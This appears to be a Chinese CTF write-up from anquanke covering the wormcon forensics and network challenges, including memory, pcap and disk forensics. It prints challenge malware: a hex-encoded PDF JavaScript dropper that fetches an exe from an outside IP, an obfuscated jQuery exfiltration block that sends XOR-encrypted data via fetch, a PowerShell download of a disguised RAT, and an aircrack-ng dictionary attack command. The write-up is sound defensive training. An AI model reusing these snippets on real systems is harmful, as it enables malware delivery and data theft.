# wormcom 0x01（forensics and network）

阅读量 **315321**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-09-23 16:30:28

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

## Secret Mission

###  Part1

> Description:
>
> Hello welcome back to work we got new project and after a great success in
> last case because of you we are giving you one more task this time. So we
> got a project from govt Secret agency that they are behind a person and they
> have doubt that he is involved with the hackers group and they given us the
> image of his system.we got a report that he got a message and next
> instruction to follow but after asking to person he is saying that he only
> got advance money and the details of it payment but no message can you find
> what is the message he received.

**cmdline**

查看命令行历史，发现notepad打开了apache日志文件，我们不应该认为这里存在flag，但是可以尝试。

    
    
    ./volatility_2\ .6_lin64_standalone -f mem.raw --profile=Win8SP0x64 cmdline
    

![](https://p1.ssl.qhimg.com/t01f1b4710d02a5f6c4.png)

**pslist**

查看进程

    
    
    ./volatility_2\ .6_lin64_standalone -f mem.raw --profile=Win8SP0x64 pslist
    

![](https://p4.ssl.qhimg.com/t01b0c02db1b263f9ae.png)

**memdump**

然后去dump对应的notepad,wordpad进程内存

    
    
    ./volatility_2\ .6_lin64_standalone -f mem.raw --profile=Win8SP0x64 memdump -n notepad.exe -D ctf/
    
    ./volatility_2\ .6_lin64_standalone -f mem.raw --profile=Win8SP0x64 memdump -n wordpad.exe -D ctf/
    

但是发现notepad和wordpad的进程内存非常大，共三个进程内存，每个进程内存的大小都大于1g，导致无法使用记事本直接打开。可以使用010Editor打开，但是很难提取到有效信息。

**filescan**

使用该插件时发现无输出，此时应该考虑更换profile。

    
    
    ./volatility_2\ .6_lin64_standalone -f mem.raw --profile=Win8SP0x64 filescan | grep -E "pdf|txt|zip|png"
    
    ./volatility_2\ .6_lin64_standalone -f mem.raw --profile=Win81U1x64 filescan | grep -E "pdf|txt"
    

输出中需要注意到`Invoice.pdf`（Invoice 为 发票）。

因此我们需要dump出该文件进行分析

![](https://p1.ssl.qhimg.com/t0154f5ae36777884be.png)

**dumpfiles**

复制对应的文件地址进行dumpfiles

    
    
    ./volatility_2\ .6_lin64_standalone -f mem.raw --profile=Win81U1x64 dumpfiles -Q 0x000000000570c430 -D ctf/
    

**forensic**

文件确实可以正常打开

![](https://p2.ssl.qhimg.com/t013205549d3de3113a.png)

010Editor打开,注意到这里有一段hex

![](https://p1.ssl.qhimg.com/t014f9a2b091e8a8448.png)

    
    
    2066756E6374696F6E20646F776E6C6F61642829207B0A2020202020202020202020202020202020206178696F73287B0A20202020202020202020202020202020202020202020202075726C3A202768747470733A2F2F3133342E31322E35362E31323A363433342F7A7A7A2E657865272C0A2020202020202020202020202020202020202020202020206D6574686F643A2027474554272C0A202020202020202020202020202020202020202020202020726573706F6E7365547970653A2027626C6F62270A2020202020202020202020202020202020207D290A2020202020202020202020202020202020202020202020202E7468656E2828726573706F6E736529203D3E207B0A202020202020202020202020202020202020202020202020202020202020636F6E73742075726C203D2077696E646F772E55524C0A2020202020202020202020202020202020202020202020202020202020202020202020202E6372656174654F626A65637455524C286E657720426C6F62285B726573706F6E73652E646174615D29293B0A202020202020202020202020202020202020202020202020202020202020636F6E7374206C696E6B203D20646F63756D656E742E637265617465456C656D656E7428276127293B0A2020202020202020202020202020202020202020202020202020202020206C696E6B2E68726566203D2075726C3B0A2020202020202020202020202020202020202020202020202020202020206C696E6B2E7365744174747269627574652827646F776E6C6F6164272C20276E632E65786527293B0A202020202020202020202020202020202020202020202020202020202020646F63756D656E742E626F64792E617070656E644368696C64286C696E6B293B0A2020202020202020202020202020202020202020202020202020202020206C696E6B2E636C69636B28293B0A202020202020202020202020202020202020202020202020202020202020646F63756D656E742E626F64792E72656D6F76654368696C64286C696E6B293B0A2020202020202020202020202020202020202020202020207D290A2020202020202020202020207D0A0A696628646F776E6C6F61642829297B0A09616C6572742822776F726B20446F6E65203A29206432397962574E76626E745152455A66647A46306146394B553138786331394F4D4852664E4735664D47786B58314E306557777A66513D3D22290A7D0A0A
    

我们通过xxd进行还原

    
    
    echo "" | xxd -p -r
    

![](https://p0.ssl.qhimg.com/t010616174638b55458.png)

最后经过base64解密即可

    
    
    wormcon{PDF_w1th_JS_1s_N0t_4n_0ld_Styl3}
    

![](https://p4.ssl.qhimg.com/t01fd843cde663a3227.png)

###  Part 2

> He is contacting to the group via uncommon browser you have to find what is
> the name of the file on the system which he used to install and have to
> figure out did he open that browser or not. If yes then md5 the second last
> registry value added by that browser and if not open then md5 the last
> registry value added by that browser.

**Tor**

首先，不常见的浏览器，我们应该想到暗链中的洋葱浏览器，也就是Tor浏览器。其次，我们需要找到可执行文件的文件名，并确认他是否打开该浏览器，最后需要我们去提取注册表值。

关于Tor浏览器

[(PDF) Forensic Analysis of Tor Browser: A Case Study for Privacy and
Anonymity on the Web
(researchgate.net)](https://www.researchgate.net/publication/332004753_Forensic_Analysis_of_Tor_Browser_A_Case_Study_for_Privacy_and_Anonymity_on_the_Web)

**volatility**

    
    
    /volatility_2\ .6_lin64_standalone -f mem.raw --profile=Win81U1x64 printkey -K "Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store"
    

![](https://p2.ssl.qhimg.com/t01f226b41a8ad897cb.png)

能得到其值

    
    
    C:\Program Files (x86)\Windows NT\Accessories\T0rbR0Ws3R-10.0.1.exe
    

###  Part 3

> Description:
>
> We find that he got project to develop a web project for the hackers but in
> hurry he leaked the critical information while developing a web project on
> his system. Find the information he leaked unintentionally

注意到两个重点信息

    
    
    web projectcritical information
    

**apache**

我们需要想到之前的apache2日志方面的信息并没有使用过，之前尝试过dump进程，但是效果并不好，试一下filescan，找到了access.log，dump下来。

    
    
    ./volatility_2\ .6_lin64_standalone -f mem.raw --profile=Win81U1x64 filescan | grep log         ./volatility_2\ .6_lin64_standalone -f mem.raw --profile=Win81U1x64 dumpfiles -Q 0x000000007c87d350 -D ctf/
    

**strings**

我们通过strings输出里面的内容，找到了奇怪的url，

![](https://p2.ssl.qhimg.com/t01f2728f9d7dcba517.png)

进行base64解密后拿到了flag。

![](https://p3.ssl.qhimg.com/t013b0f8599b7932b4d.png)

## Network At Risk

###  Part 1

> **Description:**  
>  We are in danger again we got a incident report by our system and after
> that we capture the network traffic but I think this is not a normal and
> easy one we have to do deep analysis but due to shortage of time I am giving
> the task to you. Hope you will find something intresting.

查看该流量包，总体上来看流量分为https和http两块流量。

**http**

http流量如下，我们需要注意到最后一个奇怪的http访问。

![](https://p0.ssl.qhimg.com/t01c3f7301c2e25f6cf.png)

**malware**

我们标记该流量包，并往上翻可以看到很多css和javascript的文件。其中的html文件没有异常，那么我们考虑是javascript中藏了恶意代码。查阅jquery代码，找到了恶意代码块

    
    
    function a4sSiIgGn_vVa4lLuUe(text){                                                            CONTENT  = text ;                                                            return 1                                                        }                                                        function g3tTh3Wh4T(url){                                                            var request = new XMLHttpRequest();                                                            request.open('GET', url, true);                                                            request.send(null);                                                            request.onreadystatechange = function () {                                                                if (request.readyState === 4 && request.status === 200) {                                                                    var type = request.getResponseHeader('Content-Type');                                                                    if (type.indexOf("text") !== 1) {                                                                        a4sSiIgGn_vVa4lLuUe(request.responseText);                                                                                                         fetch('http://127.0.0.1:1337?' + enCrYpTX0r(CONTENT,k3Y) );                                 function enCrYpTX0r(text, key) {        return Array.from(                                                            text,                                                            (c, i) => (c.charCodeAt() ^ key.charCodeAt(i % key.length))                                                            ).join('s');                                                    }
    

**xor**

可以看到这里url后添加的是经过xor加密的代码块，我们找到key之后对url中的参数进行xor变换即可。

![](https://p0.ssl.qhimg.com/t01a1aabd13510572d7.png)

###  Part 2

> **Description:**  
>  This is the another network traffic we capture for the another network we
> followed the same process you told us in previous one but that doesn’t work
> in this case can you help us out in this also.

**ftp**

打开流量包，在前面就能看到FTP协议流量，由于FTP是一个比较容易跟踪的协议，我们这里直接跟踪ftp。

![](https://p5.ssl.qhimg.com/t019322287b6f99644f.png)

一共只有100多个tcp流，我们一个个查看过来即可，能找到一个加密的zip压缩包。对应着tcp.stream eq 0 中的

![](https://p0.ssl.qhimg.com/t0188f6b592b716e64c.png)

其数据在tcp stream sq 107中

![](https://p1.ssl.qhimg.com/t01d0e8afe211a50ff4.png)

当然也可以通过binwalk进行提取。

![](https://p1.ssl.qhimg.com/t015529c723170018ee.png)

然后尝试了伪加密和暴力破解的方法，都失败了。想到我们已经得到了ftp的账号密码，尝试密码，即可成功打开压缩包。

![](https://p3.ssl.qhimg.com/t015c4f6a1bb560bc34.png)

###  Part 3

> Description:  
>  We work for secret govt agencies and we got a report that there will attack
> on the state by terrorist group and our spy send us some files in three
> parts which he captured from their network can you tell what is happening on
> the network.
>
> Note: put _ between the words and put them in the flag format

需要注意到这里的sip:[1111@192.168.135](mailto:1111@192.168.135).128

**Voip**

是一个Voip的电话流量，直接在wireshark里面播放

![](https://p0.ssl.qhimg.com/t0112bdd2a18faa0dce.png)

或者使用pcap2wav工具，这里也有提示[PCAP2WAV RTP2WAV
(xplico.org)](https://pcap2wav.xplico.org/)

![](https://p1.ssl.qhimg.com/t01571d6c42bb72341b.png)

![](https://p3.ssl.qhimg.com/t018bdfcb158c7ec25b.png)

    
    
    wormcon{welcome_to_the_world_of_voip}
    

###  Part 4

> **Description:**
>
> Help me to get into this network!!
>
> Flag Format: wormcon{password_bssid}
>
> Note: bssid is in lowecase

**aircrack-ng**

cap无线流量包，使用aircrack-ng 直接跑字典爆破即可

    
    
    aircrack-ng -b challenge.cap -w ./rockyou.txt
    

## wormonetics

###  Part 1

> Description  
>  Welcome to our organization wormonetics. Our R&D team is working on a
> secret project Project Σ. But due to an insider threat, our Project is at
> risk [ As per the law of corporate yes he is an Intern ]. After doing a lot
> of analysis we got the final person who is responsible but we find strong
> evidence so we capture the image of his PC Disk and for further
> Investigation, we need your help in return we will provide you points 😄
>
> So now you have to find what name our intern is using for contacting the
> Hackers and it will be great if you also find the email address of whom he
> is contacting. Flag : wormcon{name_email}
>
> Example: Name is Bob and email is
> [hacker@gmail.com](mailto:hacker@gmail.com)
>
> Sample Flag : wormcon{[bob_hacker@gmail.com](mailto:bob_hacker@gmail.com)}
>
> Password: DiskF0r3ns1cswormc0nCTFh4ckS

我们拿到了一个001后缀的文件，是一个完整的文件系统。也许可以尝试仿真取证，首先用ftk Imager 打开。

查看常见路径，首先在vmware和主机传输的缓存目录找到了一个Thunderbird 安装包。

![](https://p1.ssl.qhimg.com/t01de7d5c402d460029.png)

通过查询可知是一个电子邮件客户端。

![](https://p1.ssl.qhimg.com/t01bbf06c17869e5947.png)

我们导出被调查者的用户文件夹，准备查看对应着电子邮件客户端的数据文件夹。使用everything，搜索sqlite,通过尝试即可知道是history.sqlite

![](https://p4.ssl.qhimg.com/t0119d72b9c08fa442b.png)

使用DB browser 打开sqlite文件

![](https://p2.ssl.qhimg.com/t01e0c005c0333f4d2b.png)

也可以使用bash一把梭

    
    
    grep -r ".com" ./
    

![](https://p3.ssl.qhimg.com/t01164f494f3c8e7d32.png)

也可以进行仿真。

我们在虚拟机中进行profile的导入,打开manager 进行profile的导入。

    
    
    "C:\Program Files\Mozilla Thunderbird\thunderbird.exe" -P
    

导入路径为，导入后成功看到了右键信息。

    
    
    C:\Users\Scr1pt\Desktop\l3v1ath4n\AppData\Roaming\Thunderbird\Profiles\txswyalh.default-release
    

导入成功后能看到

![](https://p5.ssl.qhimg.com/t014128e8451e88a868.png)

###  Part 2

> DESCRIPTION  
>  We worked on the email you provided us earlier and we get to know that our
> Intern received an secret mail from the Group having information about where
> they will further communicate. Now your task is to find where they are
> planning to communicate and reach there to check what they discussed.

通过ftk Imager 寻找eml，找一些常见的路径，在Get Your Offer.eml，常见的钓鱼邮件名。

![](https://p3.ssl.qhimg.com/t014b02b32c0c2b87ee.png)

我们在邮件中能找到一个xls文件和一个html文件。

对于xls文件，常见的vba宏代码，我们需要使用oletools进行查看的提取。

    
    
    python3 oledump.py annual_report.xlspython3 oledump.py annual_report.xls  -s 3
    

提取出stream 12，stream 13，这两块是vba宏代码我们使用脚本进行decompress

    
    
    python3 oledump.py annual_report.xls  -s 3 -v
    

很明显能看到两个数组，ascii码转换成字母即可

    
    
    vald_12 = Array(80 76 51 65 83 51 83 51 67 85 82 51)valid1 = Array(65 80 84 45 49 51 51 55 45 83 72 52 68 48 87)
    

![](https://p1.ssl.qhimg.com/t01e4e60335a4232f49.png)

    
    
    APT-1337-SH4D0WPL3AS3S3CUR3
    

但是我们并不知道这里是一个账号密码。

我们回去查看html文件，发现这里需要一个账号和密码，我们尝试输入上面这两个数据，但是由于网站关掉了访问不了，所以导致了我们登录后直接404了。

跳转路径如下

    
    
    /renga-idprovider/pages/newwindow?new_url=https://apt-login.vulnfreak.org
    

###  Part 3

> Description:
>
> After last evidence we are sure and ask the Intern about this so he told us
> that he also don’t know what happened he said after the last message he
> received there is no communication between them and also his system is start
> behaving suspicious. We think they inject malware to the system if this is
> true you have to find what is the name of the malware file on the system and
> which family malware belongs.

我们通过ftk imager导出文件夹，火绒扫描出了ifconfig.exe是一个木马文件。

用virustotal上传该木马

![](https://p4.ssl.qhimg.com/t014809bc6f3677b5c9.png)

即可得到

    
    
    wormcon{ifconfig.exe_Bitter_Rat}
    

**tips**

我们也能查看到powershell历史

    
    
    \Users\l3v1ath4n\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    

命令行历史

    
    
      Id CommandLine  -- -----------   1 cd ../   2 cd ../   3 pwd   4 cd .\Users   5 cd .\Public   6 ls   7 cd .\Music   8 ls   9 cd ../  10 cd ../  11 pwd  12 cd ../  13 cd .\AppData\LocalLow\Microsoft\CryptnetUrlCache  14 cd .\Content  15 ls  16 clear  17 Invoke-WebRequest -Uri https://github.com/0xwadfg/malware/blob/raw/sm3r.exe -OutFile ifconfig.exe  18 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12  19 Invoke-WebRequest -Uri https://github.com/0xwadfg/malware/raw/main/sm3r.exe -OutFile ifconfig.exe  20 ls  21 ls | grep ifconfig
    

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Scr1pt** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/252950](/post/id/252950)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [forensics](/tag/forensics)
  * [network](/tag/network)

 **+1** __1赞

 __收藏

![](https://thirdqq.qlogo.cn/g?b=oidb&k=vjicoX0azzqIIhmSdjJo9hQ&s=40&t=1606815583)
Scr1pt

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

